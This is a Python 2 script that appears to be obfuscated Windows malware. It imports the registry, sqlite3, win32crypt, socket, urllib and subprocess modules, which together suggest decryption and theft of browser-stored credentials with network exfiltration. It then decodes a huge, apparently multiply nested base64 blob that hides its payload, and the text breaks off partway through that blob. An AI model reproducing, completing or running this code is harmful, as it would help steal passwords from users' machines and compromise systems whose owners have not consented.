import base64
import subprocess
import tempfile
import _winreg
import platform
import time
import os
import socket
import urllib
import sqlite3
import win32crypt
import sys

A13BGD = base64.b64decode(b'Vm0weE5GbFdWWGhVV0d4WFltdHdUMVp0TVZOWFJteFZVMnhPYUZKc1NsWlZNbmhQWVd4S2MxZHFRbUZTVjFKSVZqQmtTMUl4VG5OYVJtaG9UV3N3ZUZadE1UUlpWMDE1Vkd0a1dHSkdjSEJXTUdSdlZGWlplRmRzV214U2JIQjZWa2MxVDFZeVNrZGpSbWhhWWtaV05GUnJXbHBsUm1SelYyMTRVMDFFVmxwV1ZFb3dWakZhU0ZOcmFHaFNlbXhoVm10V2NrMUdjRVZTYlhSWVVqRktTVlZ0TVhkaFZscHpZMFp3VjFaNlJYZFpla3BIVmpGT1dXSkhlRk5XUjNob1ZtMXdUMVV5UmtkalJtaHNVbTVDYzFWdE1WTk5SbEY0VjIxMFZXSkZjRWRXTW5SM1ZqRmFSbU5FVGxkaGExcFRXbFZhZDFKdFNrZFRiV3hYVFcxb1dsWnJXbGRaVm14V1RWaE9hbEp0VWxsWmJHaFRZMVpTVjJGRlRsUmlSbkJKVkZaU1UxWXdNWEpqUm5CWVZrVTFkbFpxUmtwbGJVWkpVMjFHVTFKWVFrbFdiVEY2WlVaa1YxTnVUbFJpVjNod1ZXMDFRMVpXV25KWGJYQk9WbXhhZVZSV1ZtdFdNV1JJWVVac1dtRXhXak5aZWtaWFpFZFdSbVJIZUdsU2JrRjNWMnRXYjJFeFduSk5WbHBxVWxkU1YxUlhjRmRYUmxwMFl6Tm9hbFpzY0hoV1IzaGhZVlprUmsxVVVsZGlWRVkyV2xWYWExWXhTblZUYkVKWFlrVndWVlpHWTNoaU1WWnpWMWhvV0dKWVFuTlZha0pYVFRGU1YxZHRkRmRpVlhCSlZsZDRZVll5UlhoWGEzaGFaV3RhZWxac1dsTmpiRTUwWlVkc1UwMHhSalpXYlRFMFlqSkplRmRZYkZSaE1YQnhWVzE0ZDFsV2JGVlNibVJYVW14d2VGVXlkR0ZoTURGRlZteGtWMUl6YUZoV1IzaGhZekpPUlZkc1pGZE5NbWh2Vm0xd1IxbFdXWGhUYmxaVVlYcHNXRlJVUmt0VlJscEhWbXhrYTAxWFVraFdNalZQVm0xRmVWVnNhRnBpUm5Cb1ZUQmFWbVZWTlZaUFZuQlhWa1ZKTVZkV1ZtRlpWbVJ6V2tWc1VtRXlhRmhaVkVaM1lVWnNObEp0ZEd0U2EzQjZWakl4YzFVeFdrZFhiR3hYWWxob2FGbHFTa1psUjBwSFYyczFWMVpzY0ZsWFYzUldUVlpzVjJKR2FHdFNXRUp5VkZaYWQyVkdWblJrUkVKWFRVUkdXVlpYTlhOV1ZURlhZMGhLVjJGcldtaGFSV1JPWlcxR1IxcEhiRk5pYTBwMlZteGtkMUl4WkhSV2EyUllZbXhhVlZsc1pEUldSbGwzVm10MFYxWnNjRmxhUlZwclZrVXhjMU5zYUZoaE1taE1WbXBLUzFkV1ZuTmhSbFpYVFRKb1RWWlVSbUZaVms1SVZXdG9VRlp0YUZSVVZXaERUbFphVlZOVVJsSk5WbkF3VlcwMVMxZEhTa2hoUmxwWFlsaG9NMWt5ZUhKbFJtUnlUMWR3VGxkRlNraFdSM2hoVkRGU2MxZHNiRkpoTTFKWVdXeFNRMDB4VWxkWGJGcHNWbXR3TVZaSGVGTlhSa2w1WVVaYVdGWjZRalJXVkVaelZqRldjMkZGTlZkU2EzQjVWbTB3ZUUxRk1IaFhibEpxWld4YWIxbFljRWRXTVZKellVaE9WMDFFUmpGWlZWcERWakZKZW1GSGFGWk5SMUpZVldwR1UyTXhjRWRhUjJ4VVVsVndNbFp0TVRSVk1VbDRWVmhvV0dKc1NsVlpWRVozVjBac1dXTkdaRmRTYkVwWldsVldNR0pHU25SVmJHaFhUVzVvY2xsVVFYaFdNazVIWVVad2FFMXRhRWxXYlhSclV6RmFjMXBJU2xCV2JIQnZXVlJHZDFOV1draGxSMFpYVFd4S1IxUnNXbk5XVjBwSlVXeG9XbUV5YUVOYVZWcHJWakZhYzFkck9WZGlWa28yVm1wSk1WVXhXblJUYTFwVVlsZG9XRmxzVWtkV1JsWTJVbTVrV0ZJeFdraFdSekV3VmpKS1YxTllaRmRXZWtJMFdYcEtSMVl4VG5OaVJrcHBZbGRvV1ZkWGVGTlNNREI0Vm1wYVZHRjZWbk5XYlhoaFpXeGtjbHBJWkZaTlZtdzFXVlZhUzFZeVNsbFZiR1JWVm0xU1VGWnFSbGRqTVhCSVlVWk9iR0pZYUZaV2JUQjNUVlpGZUZSclpHbFNiSEJZV1ZkMFMyTkdWblJsU0dST1ZteGFXVnBWYUU5V01WbDNZMFZvVmsxdVVsUldha3BIWTIxT1JtVkdaR2hoTVhCNVYxUkdZVmxYVFhsVWEyaHNVakpvVDFSVlZuSmxWbHB4VTJwQ2FHSldXa2hXUm1oelZsWmtTR1ZHYUZwV1JYQlVWbTE0YzJNeVJrZFViR2hUWW10S1dsZHNWbGROUjBWM1RWWmtXR0pHY0ZkVVZ6VkRWa1phY2xaWWFGZGlWVFZLV1RCYVlWUnNXWGxoUkVwWFlrWmFhRmRXV21GWFJrNXlXa1pXYVZJeFNuZFdWekV3WkRGT1YxZHNhR3BTVjFKV1ZGWmFkMlZzV25SbFNFNWFWbXRzTTFZeWN6VldiVVp5VGxoYVZXSkdjR0ZhVm1SVFUwVTVWMk5HWkU1U2JrSlpWbXRhWVdJeFZYaFhibEpVWW14YVUxbHJaRFJaVm14VlVtNWthRkpzY0ZkV01qVlBZV3hhY2s1WWJGVk5WMUYzVmxSR1lWTkhWa2hTYkdScFVqQTBNRlpYY0VkWGJWWkhXa2hPWVZJeWVGUlZiWFIzVjJ4a1YxVnJaRnBXTURWWVZsYzFUMWRIU2taT1ZtaFZWak5TTTFVd1duTmpiR1IwWkVkb1YwMUlRa2xYVkVKcllqRlplRk51VWxWaGJFcGhXVmQwZDFSR1duRlNiR1JZVmpCYVNGWXlNWE5oUlRCM1UycGFWMkpVUlRCV1ZFWktaVVprZFZSc2FHaE5iRXBZVjFaU1QxVXhXbk5WYkdoclVqQmFjMVp0ZUhkTlJtdDNWbFJXVjAxV2NIcFphMUpoVjJ4YVdHRkZlRmRpVkVaTVZqRmtSMUp0UmtkYVIyeFlVakpvV2xadGNFZGhNVTE0VTI1S1QxWnRVbWhWYlhNeFYwWldjMWRzWkU1TlZuQXdXa1ZrUjJGRk1VVlNhMmhYVFZkb2RsWXdaRVpsVmxaelZXeHdhRTFZUVhwV2JYQkhWMjFSZVZKcldsVmlSbHBQVm0wMVEwNVdXblJsUnpscFRWWkdORlV5TlU5V1IwcElaVWRHV2xaRldtaFVWRVpoWTJ4YVdXRkdaRTVXTVVsNFYxZDBZV0V5UmxkYVJXUlVZV3R3V0ZsWGRHRldNWEJXVjJ4d2JGWnNTbmxXTW5oWFlWWkplRk5zVmxkaVZFRjRWVlJHYTFZeFpITmhSVFZYVWxWd2VGWkdXbGRrTVZsNFZXeGtWMkpVYkdGV2JYUjNWMnhhV0U1Vk9WZE5hM0JKVmxaU1ExWldXbk5qUm1SaFZsWndhRmt5Y3pWWFIxWklZa1pPYkdKWVRqTldiVEYzVXpBeFIySkdaRmhYUjNoVVdWZDRkMWRHYkhKYVJrNVhUVmQ0ZWxsVlZrOWlSMHBIWTBac1lWWldjSEpXYWtGNFYwWldkV05HWkZOTk1taFZWbTF3UjFkdFZuUlNhMXBZWWtkb1dWVXdWa3RVVm1SWFZXdGtWV0pXUmpOVVZscHJZVlpKZVdGR1VsZGhhelYyV1ZWYWExWXhjRVZSYlhCb1pXdGFXVmRYZEc5Vk1WSnpWMnhzVm1KR1dsZFpiR2h2VFRGd1YxZHRSbGhTVkVaWlZERmFhMVV5UlhwUmJVWlhWbXh3ZGxsNlJtdFNNV1JaWTBkb1ZGSllRbGxYVm1Rd1dWWk9SMk5GV2xoaVIxSnhWRmQwZDFOR1dYbE5XRTVvVm1zMVIxVXllRzlXTWtwSVZXcE9WbFpGV25KYVJWcGhZMnh3U0dKR1VsTmhNMEpSVm0weE5GVXlUWGxVYTJSV1lrWndiMVZ1Y0hOVU1WWjBaVWhrVGxKdGRETldNbk0xVjBkS1IyTkljRmRpV0VKWVZtcEdTMDVzUmxsaFJtUm9UVlpaZWxkc1dtdFdNVXB6Vlc1T2FsSXllRmxWYlhSMlRXeFplRlZyVGxwV01EVXdWbTE0YTJGc1NsZGpTRTVXWVdzMWRsWXdXbUZqTVdSMVYyMTRVMkpJUWxkV1Z6RTBZVEZhV0ZOc1pGTmhiRnBZVm1wT1UyUnNXbkphUlhScVRWVTFlbFZ0ZUdGVWJFcDFVV3N4V0ZaRldtaFdWRVpoVmpGT2RWTnRkRk5OYm1oUVZtMXdUMVZyTVZkWGEyaHNVakJhVmxSV1drdGxiRmw0WVVkMFZVMVdjRmhXTW5oaFZqSktXV0ZGZUZkV1ZuQjZWbTE0YTJSR1NuSlBWMnhUWW10R05GWnNVa3RPUjFGNVVtdG9VMkZzY0ZoWmJURnZWMFpTV0U1VlRsTlNiRXBXVlRKNGEyRnJNVlpqUkVaWFlsUkdlbFpVUVhoU01rNUhZa1prVTJKSVFqSldWbEpMVmpKTmVHTkZiRlJpUjFKd1ZqQmFTMVl4V2tkYVJFSnFUVVJDTkZaV2FHOWhSa3BZVld4b1ZWWnNjREpVVjNoaFpFZFNSMXBHYUZOTlJuQTFWa2Q0VjFVeFpISk5XRlpvVTBWd1lWcFhkR0ZOTVZaeFUyczVWRkpyY0hsVWJHUnZZa2RGZUZacVVsZGlWRUl6V2xWa1VtVkdTbGxoUjBaVFlraENVRlpVUW10Vk1rNVhWbGhrVjFaRldsbFdiVEUwVjFad1JsZHRSbFZpUm5Bd1drVlNWMWxXV2xoaFNFcFhUVVp3WVZwRVNrOVNiVXBIV2tVMWFHRXhXWHBXTVZwaFdWWnNWMWRZYkZWaE1WcFpXV3RrYjJJeFVsZGhSVTVzVm14d01GUlZhRzlXUjBwWFYydG9WMDFxVmxoV2EyUkxVMFpXZEU5V1ZsZGxhMW95VmpGYVlWbFdTWGhhU0U1aFVteEtUMVpzV2xwTlJscHhVMVJHVkUxV2JEVlZNbmhYVmpKS2NsZHNXbGRpUjFKVFZGVmFWbVZHWkhOVWJYQk9WMFZLU2xaRVJtdGlNVmw1VTJ0b2EyVnJTbGhaYkZKQ1pVWndSVkp0UmxOTlYxSjZXVlZrYjFVd01YUmhSMmhYWWxob2NsWlVSbE5TTVZwWllVWm9hVlpXY0hsV1YzQkhXVlpKZUdOR1dsaGlXRkpYVkZkNFlVMUdjRlpXVkVaWFRWWndSMVl5ZUc5V01VcEdWMnRvV21WcmNFdGFWM2gzVTBkS1IxUnNaRTVOYldoYVZtcEdhbVF5VmtaT1ZXaFZWMGRvV1ZsdGRIZFpWbkJZWlVkR1YySkdXakJaTTNCSFZqQXhWMk5GYkdGU1ZsbDNWako0WVZaV1NuSmlSMFpYVm14d1dWWnRNVFJaVjFKSFZtNVdWR0pHY0U5WmJURnZVMFprY2xWclpGVk5helZZVmpJMVQyRkdTWGxsUmxKVlZteGFNMVJzV2xwbFJsWnlWRzFvVGxacmIzZFdiVEF4VkRGWmVWTnVUbGhpYTBwWFdWZHpNV1JzV1hkWGJrNVlVbFJHVmxaWGN6VldNa3BJWkhwR1dHSkdXbkZVYkdSSFpFWk9jbUZHUWxkU2EzQllWbTF3VDJJeFdrZFhiR2hPVmxoU1dGUlhjekZUYkZWNVpVWmtWMDFzV25sV2JHaHJWakZLYzJOSGFGcE5ha1pZVm0xemVGWXhjRWhTYkU1T1ltMW9NbFpyV2xOVE1rbDNUbFprV0dFeFdsUlpiRkp6WWpGU1YxcEVVbGhTYkd3MVdUQmtSMVl3TVhKWFZFcFdZbGhvZWxZeU1VWmxWbFoxVjIxR1YySklRalpYVkVaaFV6SlNSazVXYUd4U01uaFZWV3hXZDFSR1duTlhiWEJzVWpBeE5WVnRlRzlWTVdSSlVXeE9XbUpVVmtSV01GcFRWMGRPUjFwSGVGZGlSWEJaVm1wS2VrNVdXWGROVm1SVVlraENXVmxVUm5kamJHeFhWMnM1VTJKRk5UQlZiWGhyVlRKS1IyTkdhRmRTYkhCb1ZqSXhWMUl4Y0VsVWJXaFRUVEpvVlZacVFtRlRNVnBYV2tab2ExSXdXbFZVVjNoaFpXeFplV1ZIT1ZWaVJtd3pWako0YjFaV1duTmpSRTVoVm14d1ZGbDZSbUZrUjFKSFdrVTFWMkpZWTNoV01uUlRWREpSZUZwRmFGTmlhM0JaV1d0a2IxbFdVbGhPVnpsb1VtMTBOVlJXVm10Vk1ERnlZMFZrVldKR2NISldha1pyVW14T2NsZHNaR2xXUlVrd1ZrWldZVmR0VmxkVWJsWldZa1phV1ZWcVJrdGtNVnBZWlVkR1dsWnNWalJXTVdoclZqRmFSbGRzYkZwaE1YQk1WbTE0Vm1WWFZrWlBWMmhPVWtWYVdsZHNWbE5STVZwWVUydGtXRmRIVW1GV2JYaDNWRVp3UjFkclpGZFdhM0I2Vm0weGMxVXlTa2hrUkU1WFlsaG9WRlZxUm5OWFJsWnlZVVprYUUxdGFGQldiVEUwWkRGa1IySklTbGhpYTNCeVZGWmFkMlZXV1hsTlZXUm9WakJ3V0ZWdGNGTldhekZ4Vm10NFYySlVSa3hWYlRGUFVtczVWMWR0YkZoU01tUTJWbTB3ZUU1R2JGaFVXR3hUWVRKNFZsbHNhRU5qUmxaelZXdGFiR0pIVWxsYVJWcHJWbXN4VjFkdWNGZE5WMmg2Vm0weFJtVnNWbk5hUm1Sb1RWWndUVlpVUW1Gak1sSklWbXRhVUZadFVuQlZiWFIzVGxaYWNsa3phRk5OYTFwWVZqSTFTMWRHV2taWGJHeFhZV3MxVkZwSGVHRmpWazV5V2tkMFUyRjZWalpXTW5SaFlqSkdXRk5yWkdwU2JWSllWbXBPUTFWR2JIRlNiR1JUVFd0d1NsVXlNVWRWTWtZMlZteFdWMUpzY0hKV1ZFRjRVakpLUjFkdFJsUlNWRlpaVmxjeE1HUXlWbk5oTTJSb1UwZFNXRlJXV25OT2JHeFdZVWRHV0dKVmNGWlZiWFF3V1ZaYWMyTkdVbUZTYkhCWVdYcEdkMU5IU2tkYVJrNXBVMFZHTlZadE1IaGtNVVY0VjI1S1RsWlhhRmRXTUdSdllqRlNWVk5xVWxaU2JHd3pWbXhTUjJGR1NuUmxTSEJYWWxob2NsWkVSbUZqTWs1RlVXeHdUbEp1UW5sV2JYaGhXVmRPYzFkdVJsVmlSbkJQV1cxMFMxTldXbkZSYlVaYVZqRktTRlpYTlVkV2JVcEpVVzA1VlZac2NIbGFSRVpoVjBkU1NGSnNUazVXTVVwWlYxUkNWMWxXVW5OWGJrcHFVbFJzVjFsclpHOVNSbEpXVjJ4d2JGWXhTa2hXUjNoVFZHMUdObEpVUmxkaVIxRXdXV3BHWVZkR1RuVlViRkpwVWpKb2FGZFhkR0ZUTVdSSFYydG9iRk5GTlhGWmExcDNUVlprY2xkck9WVmlSbkI2V1RCU1UxWXhXWHBoUmxKWFlXdGFZVnBWV2s5a1ZsWnpWMjFzYVZacmNIWldiR1F3VmpKUmVWUnVUbWxTYkZwVldWUk9VMWRHYkhKYVJrNU9WbTEwTTFkclZtdFdhekZ5WTBab1ZrMXVhSFpXTUZwaFVteE9jMkZHWkZOU1dFSlJWbGR3UjFNeVRYbFNhMmhUWWtVMVdWVnNWbmRXVmxweVYyeGtWMDFzUmpWV2JUVlBXVlpPUms1V2FGcGlSMmhVVm0xNFUxZEhVa2xhUmxKWFlraENTbGRyVm05VU1WbDVVMnRrYVZKR1dsaFdhazV2Wkd4YWMxZHRSazlpUlhCV1ZWZDRWMVl5U2tsUmJteFlWa1Z2TUZsNlFURmpNV1IxVTJzNVYxWkdXblpYYkdRd1ZqQTFjMWR1VWs1VFIxSlBWbXBCZUU1V1ZuUk9WazVYVWpCd1NGWXlOVU5XYlVWNFkwZG9WMkpZYUZSV01GVjRWakZTY2s1WGJGTk5WVzh3Vm14YWFrMVdVWGhXV0doVVltdHdXVmxyWkRSWFZteFZVbTFHVGsxV2NGbFplazV2VlRKS1NGVnFSbGRpV0dob1ZrZDRZV015VGtWVGJHUlhZa1Z3VFZaWGNFZFVNVWw0Vm01T2FWSXpRbFJaYTFwM1YxWmFjVkZ0UmxSTlZYQjZWMnRhYjJKR1NYZFhiRlpWVmpOT05GUnJXbXRqYlVaSFZHMW9WMkV6UWxoV1IzaHZVVEZaZVZKdVNsUmlWMmhZVkZjMWIxWXhjRmRXV0doWFZteGFlbFp0ZUU5aFJURlhZVE5vVjAxV1NsQmFSRVpPWlVaYWRWTnJOVmhTYTNCNlZsZDRWazFXWkZkaVJtaHJVbGhTYzFscldtRmxWbGw1WkVkMGFFMVdjSGxXTW5CRFZtMUtWVkp1V2xkaGExcG9WakZhUjJNeFRuTmFSMnhZVW10d1ZsWnNZM2hsYXpGWFYxaG9WbUpzV2xaWmEyUlRZakZTV0dWRmRGWmlSbkF3V2xWa01GUXhTbk5qU0hCWFZqTm9jbFpxUm1GU2JHUnpZVVp3YUUxWVFrbFdSM2hoWVRKT2RGSnJhRk5pU0VKWVZtdFdZVk5zWkhOV2JHUlhUVlp3ZWxZeU5WTldiVXB5WTBaa1ZWWjZWblpWYWtaM1VsWktjbVJIZEZOV1JscFpWbXhrTkdFeFdYaFhhMlJZWWtWYVdGbFhkSGROTVZaeFVtdDBhMUpzY0hwWlZWcFBZVVV4ZEdGSWNGZFdla0Y0VlZSR1VtVkhTa2xWYlhCc1lURndlVlp0TUhoVk1XUkhWMWhzVGxaRlNsbFZha0ozVTFaUmVGVnNaRmRoZWtaNFZtMTRVMVl4V2xkalJrSldZV3RhVUZwRlZUVldNWEJHVGxaT2FWTkZTa3RXYWtacVpVVTFTRlJZYUZoWFIzaFVXVlJHZDFWR1duRlJiVVpWVFZkNFZsVXljRTlVYkZwelkwVnNZVlpYVFRGV2JGVjRZMnhrY21GR1pFNWlhMHB2Vm0xd1MxTXlUbkpPVm1SWFlrZFNjRlZxUmt0VlJscEhWMjFHYTAxV2JEUldNalZYVmxkS1IxTnNVbGRoTVhCb1YxWmFZV05XVGxsaFJUVlRZa1p3TmxacVNuZFpWMFpYVkd0a1dHSkhVbFpXYlhoM1lVWmFWbGRzWkZoU01WcEtWakl4TUZSdFJYcFJhMmhYWWtkUk1GVjZSbHBrTURGWlZHeFNhRTB5YUZsV2JYQlBVVEZGZUZWc1pHRlNhelZ4VkZab1ExTnNXa2hOVldSV1RWWndTVnBWYUc5WFJsbDZWVzVLV2xaRlJYaFdha1pYWkZaU2RHRkdUazVTYmtKaFZtMHhORlV4U1hkTlZXUnFVbXh3VjFsWWNITlhWbFowWkVoa1UwMVhlRnBaTUZaclYyeGFjbU5FUWxkV00xRXdWbTF6ZUZOR1ZuSmxSbHBPVm01Q2IxZHJWbUZUTWsxNFdraEtUMVl5ZUZoWlZFb3pUV3hhZEdWSFJsWk5WVEUxVld4b2MxWnRTbkpPV0VKVlZrVndWRmt3V2xkak1XUnlaRVphVGxadVFqUldWRW8wVkRKR1ZrMVdaR3BUUjJoWFdXeFNWMVZHYkZkYVJYUlVVakZLUmxaSGVHOWhSVEZXWTBaV1dGWnNXbWhWTWpGWFVqRlNkVk50YkZOaVZrcFFWMVprTkZsWFNYaGFSbVJhVFRKb1ZWUldXbmRYUmxaMFRsVmtWazFyY0VwVlZ6VkRWbTFHY2xkcmVGWk5WbkJ5Vm1wR2NtVnRSa2RVYXpWWFZrWmFTMVpzVWt0TlIwMTRWMWhzVkdKR2NGbFphMlJUVm14YWRXTkZaRmRTYkVwV1ZXMHhSMVV5U2toa1JGcGFWbFp3Y2xaSE1VdFNiVTVIWWtab1YxSlZjRmxYV0hCSFdWWmtSMU51VmxSaGVteFlXbGN4TkZkV1drZFdiVVpyVFZaS1NGa3dWbTlpUmtwVlZtNUtWVlpzY0V4VVZWcHlaREZ3UlZWdGFGTk5WbkExVm1wS2QxUXhXWGROVm1SVVlrVktWMVpyVm1GWFJsWnhVMnR3YkdKVmNFaFZWM2hyWWtkS1IyTkdaRmRpVkVVd1ZtMXplRll4U2xsaFIwWlVVbFp3VkZkWE1YcE5WbHBIVm01U2ExSXdXbGxXYlRGVFpWWmFkRTVYZEZkTlZYQjVXVEJvYzFkdFNuVlJhMmhYVFVkU1RGVnFTazlTTVZaMFVteE9UazF0YUZGV01uUlRVekZOZUZOdVRsZGlhelZWV1d0a1UxUXhiSEpXYm1SVlZteHdlbFl5ZUU5VmF6RldZa1JXVmsxcVZsQldiR1JMVWpKT1IxZHNjRmRTVlc5NlYxWldZVlV4V25OalJWWldZa1UxV0ZsclduZFhWbGw1WkVkMFRsSXdXa2xWYlhCaFZXMUdjMU5zYUZWV00wSllWV3RhV21WWFRYcGhSbEpUVFVad1NGZHNWbXRTTVZWM1RVaHNhRkpHV2xsWmExcDNZVVprVjFwR1RsaFNiRXA1V1ZWa2QxVXdNSGxoUm14WFZucEZNRnBFUm1GU01XUlpZVWRHVkZJeFNsZFdSbHBYVmpBMVYxWlliR3RTZW14WVZXcENkMlZXVlhsTlZ6bFhWbXh2TWxWc1VrTlhhekZYWTBab1lWSnRVbEJWTVZwUFpFZFdTR0pHVGs1V1Z6aDVWbXBHWVZZeFdYZE5WV2hVWVRKb1ZWbHJXbmRYVm14VlUycFNXRkp0ZUhwV1YzaHJWbXhLZEdWR2FGZE5ibEpvV1ZSQmVGWnRUa2xoUmxwWFRUSm5lbGRXV21GWlZrcHpVMnhzYUZKdGFHOVVWbFozVkZaYWNsVnJkRlpOVlhCNVZERmFhMkZHU2xWV2JHaFZWbnBHZGxZeFdtRlNNVlp5WkVkc1RtSkdjRFpXYlhodllqRlplVkpxV2xkaWF6VlhXV3RhUzFKR1VuTlhiR1JyVWpGYVNWUXhXbGRVYkZwMFpIcEtWMkpIVFhoVlZFWmhWakZrY2xkdGNGTmlSWEJYVjFkNGIySXdNSGhXYmxKT1ZsZFNWVlp0ZUV0TlJtdDNWbFJHV0ZKcmNGZFpNRnByVmpKS1IyTklSbUZTUlVWNFZqQmFTMk5zY0VkaFJtaFRUVzFvVjFZeFkzaE5SMUY0V2taa2FWTkZjR2hWYkZKWFkyeFNWMXBHVG14U2JGcFpXVEJhVDFkR1NuSmpSbHBYWWxob00xWnFRWGhqVmtwMVkwWndWMkpJUW1oWGJHUTBaRzFXZEZKclpHaFNNbWhQVm0wMVEwNVdXblJOV0dSVVRWWnNORll4YUhOV1IwVjVWVzA1Vm1KWWFHaFpha1p6VmxaR2RWcEhkR2xTYmtJMFZsWmplRkl5UlhkTldFcE9Wa1pLV0ZWcVRtOWhSbVJYVjJzNVUyRjZWbHBWVjNoaFlVZEZlR05IT1ZkV00yaG9WbXBHV21WSFNrVlhiR1JwVmpKb1dWWkdWbTlSTVdSWFYyNUdVMkpVYkhKVVZscDNWMFpWZVU1V1RsZFdiSEJIVmpJeFIxWXlTbFZTYkZKV1RVWndNMVZ0ZUd0a1JrcDBaRVpPVGxKR1drdFdNblJYV1ZaTmVGVnVUbFJpUjJoUlZtdGFTMWRHYkZoa1NGcE9VbTE0ZUZWdGVHdGhNVXB6VjI1d1dsWldjR2hXTUZwS1pXMUdSMkpHYUZkTk1taDVWa2QwWVdNeFdYaFdiazVvVWxSc1dGcFhNVFJsVmxwSFYyMTBWazFzV25wWGExcHpZV3hLV0ZWc1dscGhNVm96VmpKNFlWZEhWa2RhUm1SWFRVaENTbFpzV205aE1XUnpWMjVPVjJGck5XaFdiWGgzVjBacmVGZHJkR3BOYXpWSldWVlZNV0ZIVm5KVFZFSlhZV3RhYUZacVJuTlhSbFpaWVVaV2FWSXhTbGhYVnpFd1dWWlZlR0pJVG1oU1ZUVnhWVzE0ZDJWR1draE5SRVpwVW10d2VsbHJVbGRXVjBwSVlVWkNXbFp0VWt4V2JURlBVbFpHYzFkdGJGaFNhMjh5Vm0wd2QyVkdTWGxVYms1VllteGFWRmxyV25kVU1WWjBaVVp3YkdKR2NFaFhhMUpUVm1zeFZrNVdiRlppV0VKb1ZtcEtTMWRYUmtkaFJuQnBVakpvTWxZeFdtRlhiVlpIVm01S1VGWnRVazlXYWs1dlYwWmFSMWR0T1ZaTmExWXpWRlZvYzFadFNsWlhiR2hhWVRKU1ZGcEhlRnBrTVdSMVZHeGtUbGRGU2tsV2EyUTBZakZaZVZOcldtbE5NbEpaV1d0YVlXTnNjRVZUYTJSWFRWZFNlbFp0ZUd0WFJrbDZZVVp3VjJKVVZqTlZWekZYVWpGa2MxWnNVbWhOTVVwV1ZsY3hlazFWTVZkWGJsSnNVakJhV1ZWdGRIZGxiR3QzV2tjNVYwMVZjREJXVjNCUFYyMVdjbEpxVWxaaGExcFlXVEo0WVdNeFVuUmhSVFZUVW14dk1WWnFSbXRPUm14WFUxaGtUMVp0VWxsWmJYaExWVVpaZDFaVVJsaFNiWGhhV1RCV2ExUnNTblJsUm1SYVZsWlZNVll3WkV0V2JGcHhWbXhrVjJKRmNFVldiVEI0VXpGYVYxTnVTbXhTYlZKUFZtMDFRMU5XWkhKWGJVWlRUV3hLU1ZaSGRHOWhWa3AwVlc1Q1ZtSlVSWHBVVmxwaFpFZFdTR1JGT1ZOTlJtOTNWbTB4TUdJeFduTmFSV2hzVW14S1lWbFVTbEpOUmxwelYyNU9hazFyV2tsVU1WcFhZVlpLY21OR2NGaFdSVXBZV1ZSS1IxWnJNVmRoUjNSc1lUTkNXVlpYY0U5aU1WWkhZa1prV0dFelFuSlVWVkpYVjJ4a2NsZHNaRlZpUm13MFZXMXdUMVl5Um5KaWVrSmFWa1ZhUzFwVldsTmtWbFp6VVd4a2FWSnVRbFpXYkdRMFlUQXdkMDFWWkdGVFJYQm9WV3RhUzJOc1VsZFdWRVpZVW14c05WUnNXbXRXTVZsM1kwWmtWMDF1YUhaV01uaGhUbXhLV1dOR1ZsZE5NbWg1Vm1wQ2ExUXhTbkpQVm1SaFVsUldjRlZ0TlVOWGJGbDRWMnhPVlUxck1UUldNV2h2V1ZaS1dGVnVSbFpoYTBwb1ZtMTRZV05XVW5KVWJYaHBVak5STVZkc1ZtdE5SMFp5VFZab1ZtSkdjRmhaYkZKSFpXeGFWVkZZYUZkTmF6VkhXVEJhYTJGV1drWlRWRUpZWVRGS1RGVnRNVmRTTWs1R1YyMUdVMkpGY0hkWFYzaGhVekpHUjFwR1pHRlNSVXB4V1d4YVIwNUdhM2RXYlRscFVtdHdWbGxyV25OV2JVcEhVMnhvVjJKWWFGZGFWbFY0VjFaU2MxWnRiRmRYUlVreVZteFNTazFYVVhoWFdHaFVZa2RTY1ZWcVNtOVhSbFp5Vm01a1ZFMVlRbGRYYTFVMVZUQXhjbGRyYkdGV1ZuQlVWbFJHWVZJeFpIUlBWbVJvVFZoQ2VWZHJVa3RVYlZaWFZXNVdWV0pWV2xWVmJGSlhWakZhZEdSR1pGcFdNRFY2VmxkNGIyRnRWbkpUYXpsYVlURndhRnBYZUd0WFYwNUdXa1prVjJFelFqWlhWRUpYWkRGWmVGZFljRlpYUjFKWVZGZHdSMVJHV25OWGJVWnJVakJhU1ZWdGVFOWlSMFY0WTBWc1YwMXVhR2hYVmxwelZqRndSMXBHWkdsaGVsWmFWMVpvZDFZeVRrZFhia1pVWWxSc1VGbHJXbk5PUm1SeVZXdE9hRkpVUmtaV2JYUnpWbTFLVlZac1VsZGhNWEJ5VlRCa1YxSXhjRWRqUjJ4VFRXMW5lVlpzYUhkU01WbDRXa1pvVldFeGNHaFZiWGgzWTBaV2NWSnJkRmhXYlZKWVZtMHdOVlpWTVhKWGJteFZWbTFvVEZsV1drdFNNV1J6V2tad2FWSnJjRWhYYTFKSFZtMVdXRlpyV2xCV2JFcFVXV3RhZG1WR1dYbGtSMFpyVFd0YVdGWXlkR0ZYUjBwSFYyeHNXbFpGY0ZCVWExcGhWMFV4VjFwSGNFNVdiSEEyVjFkMFlXSXlSbGRYV0hCb1VtMTRXRlZ0ZUhkaFJtdzJVVmhrYkZKdFVscFphMlEwVlRKV2RHVkdXbGRTYlZFd1ZXcEJNVll4WkhKaFJUbFhZWHBXV1ZaR1pEQlpWMVpYVmxoc1RsWjZiRmhVVlZKSFUwWlplVTVZWkZkV2JHdzJXVlZvYzFsV1duTldhbEpYWVd0YU0xVnRjekZYUjBwSFZXeE9WMWRGU25aV2JURTBWVEZPY2sxV2FGWlhSMmh3VlcweFUxZFdiSFJrUjBacVVteFdNMVl5Tld0aFJrcHpWMjV3V0dFeVRURldha1pMWkZaR2NsZHNXazVpYXpCNFZtdFNSMWxYVG5OYVNFNXFVbTFTV0ZSVVNtOVhWbHB6Vld0S2JGSXhTa2haYWs1M1lWWktkR0ZHYkZaTlJscE1WbFphWVdNeGNFVlZiWFJwVm10Wk1WWnJaREJoTWtaWFUyNU9XR0pIYUZaV2FrNXZWRVphUlZKdFJtdFNNVnBKVkRGa2MxUnNTa1pUVkVKWVZqTlNkbFZxUm1GWFJrcFpZMFphYUdWdGVGaFhWM1JyVldzeFIxWnVUbGhpVlZweVZXeFNWMWRzWkhKWGJFNW9WbXR3V0ZsVVRuTldNVm8yVWxoa1dtRnJXbkphUlZwTFpGWk9jazlXWkZoU01taHZWbTB4ZDFReVNYZE5TR2hZWW1zMWFGVnNVbGRqTVZweFVXNWtVMDFYZEROV01uUXdWbGRLUjJOSWNGcE5Sa3BJVm1wR2ExTldSbkpWYkdSb1lUQldORlpYY0VkVk1rMTRZMFZrV0dKSGFGUlVWekZ2VjBaWmVGcEVRbHBXYlhoWVZsYzFUMVl5U25KT1Z6bFdZbTVDZWxacVJuTmpiR1IxV2taT2FWSnNiM2RYYTFaVFVURlpkMDFXWkdwU2JrSllWbXBPYjFkR1pGZFhhM1JUWWxVMVNsVXllSGRXT